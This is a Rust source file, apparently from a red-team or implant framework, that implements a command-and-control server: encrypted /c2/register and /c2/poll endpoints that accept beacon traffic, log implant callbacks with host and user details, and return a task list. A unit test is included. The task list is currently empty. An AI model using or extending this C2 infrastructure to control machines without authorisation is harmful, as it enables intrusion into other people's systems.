use std::sync::Arc;

use axum::{
    Extension, Json, Router,
    extract::State,
    http::StatusCode,
    routing::post,
};
use nw_profile::{
    crypto,
    envelope::{Envelope, Kind},
    msgs::{PollRequest, Register, RegisterAck, Task},
};
use uuid::Uuid;

use crate::db::repositories::Repository;

fn session_key(psk: &[u8]) -> [u8; crypto::KEY_LEN] {
    crypto::derive_key(psk, b"nw-m1-salt")
}

/// C2 endpoint router. Unauthenticated: the only credential is the baked PSK
/// used to derive the per-session AES key, so the portal can accept beacon
/// traffic on localhost and record it in the callbacks table. Mount with the
/// payload PSK supplied as `Extension<Arc<Vec<u8>>>`.
pub fn router(psk: Arc<Vec<u8>>) -> Router<Repository> {
    Router::<Repository>::new()
        .route("/c2/register", post(register))
        .route("/c2/poll", post(poll))
        .layer(Extension(psk))
}

async fn register(
    State(repo): State<Repository>,
    Extension(psk): Extension<Arc<Vec<u8>>>,
    Json(env): Json<Envelope>,
) -> Result<Json<Envelope>, StatusCode> {
    if env.kind != Kind::Register || env.session_id.is_some() {
        return Err(StatusCode::BAD_REQUEST);
    }
    let key = session_key(&psk);
    let pt = crypto::decrypt(&key, env.id, &env.encrypted)
        .map_err(|_| StatusCode::UNAUTHORIZED)?;
    let reg: Register = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;

    let sid = Uuid::new_v4();
    repo.upsert_callback(&sid.to_string(), &reg.hostname, &reg.username, &reg.os, &reg.arch, reg.pid)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let ack = RegisterAck { session_id: sid };
    let reply_id = env.id + 1;
    let plaintext = serde_json::to_vec(&ack).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let out = crypto::encrypt(&key, reply_id, &plaintext)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(Envelope::new(Kind::RegisterAck, reply_id, Some(sid), out)))
}

async fn poll(
    State(repo): State<Repository>,
    Extension(psk): Extension<Arc<Vec<u8>>>,
    Json(env): Json<Envelope>,
) -> Result<Json<Envelope>, StatusCode> {
    let Some(sid) = env.session_id else {
        return Err(StatusCode::BAD_REQUEST);
    };
    let key = session_key(&psk);
    let pt = crypto::decrypt(&key, env.id, &env.encrypted)
        .map_err(|_| StatusCode::UNAUTHORIZED)?;
    let _req: PollRequest = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;

    repo.touch_callback(&sid.to_string())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let reply_id = env.id + 1;
    let tasks: Vec<Task> = Vec::new();
    let plaintext = serde_json::to_vec(&tasks).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let out = crypto::encrypt(&key, reply_id, &plaintext)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(Envelope::new(Kind::Heartbeat, reply_id, Some(sid), out)))
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::Request;
    use tower::ServiceExt;

    fn b64(b: &[u8]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(b)
    }

    #[tokio::test]
    async fn register_then_poll_records_callback_in_db() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool: pool.clone() };
        let app = router(Arc::new(b"dev-psk-change-me".to_vec())).with_state(repo);
        let psk_key = session_key(b"dev-psk-change-me");

        let reg = Register {
            hostname: "laptop".into(),
            username: "you".into(),
            os: "macos".into(),
            arch: "aarch64".into(),
            pid: 1234,
            addr: "127.0.0.1".into(),
            session_key: b64(&psk_key),
        };
        let reg_pt = serde_json::to_vec(&reg).unwrap();
        let env_ct = crypto::encrypt(&psk_key, 1, &reg_pt).unwrap();
        let env = Envelope::new(Kind::Register, 1, None, env_ct);
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/register")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&env).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let ack: Envelope = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .map(|b| serde_json::from_slice(&b).unwrap())
            .unwrap();
        let ack_pt = crypto::decrypt(&psk_key, 2, &ack.encrypted).unwrap();
        let ack_msg: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();

        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(count, 1);
        let host: String = sqlx::query_scalar("SELECT host FROM callbacks WHERE id = ?")
            .bind(ack_msg.session_id.to_string())
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(host, "laptop");

        let poll_pt = serde_json::to_vec(&PollRequest::default()).unwrap();
        let poll_ct = crypto::encrypt(&psk_key, 2, &poll_pt).unwrap();
        let poll_env = Envelope::new(Kind::TaskResult, 2, Some(ack_msg.session_id), poll_ct);
        let resp2 = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/poll")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&poll_env).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp2.status(), StatusCode::OK);
        let still_one: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM callbacks")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(still_one, 1);
    }
}
